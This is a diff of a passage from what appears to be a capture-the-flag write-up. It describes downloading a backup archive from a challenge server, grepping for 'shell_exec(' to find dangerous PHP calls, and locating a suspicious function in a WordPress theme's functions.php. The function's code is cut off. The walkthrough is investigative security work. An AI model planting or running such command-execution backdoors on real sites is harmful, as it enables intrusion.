@@ -6,8 +6,9 @@
 
 4. Downloaded backup.zip using wget http://34.107.45.207:30148/backup.zip and unzipped it into a folder with unzip backup.zip -d backup_folder.
 
-5. Changed into the backup_folder and searched for dangerous PHP functions using grep -r "shell_exec("
-This pinpointed location in backup.zip that was wp-content/themes/twentytwentytwo/functions.php.
+5. Cd-d into the backup_folder and searched for dangerous PHP functions using grep -r "shell_exec("
+This pinpointed location in backup.zip that was wp-content/themes/twentytwentytwo/functions.php
+ONCE WE ARE IN location wp-content/themes/twentytwentytwo/
 We can open it with nano viewer. just write nano [name of file] so nano functions.php
 Inside it we found following code:
 function sentimental_function() { 
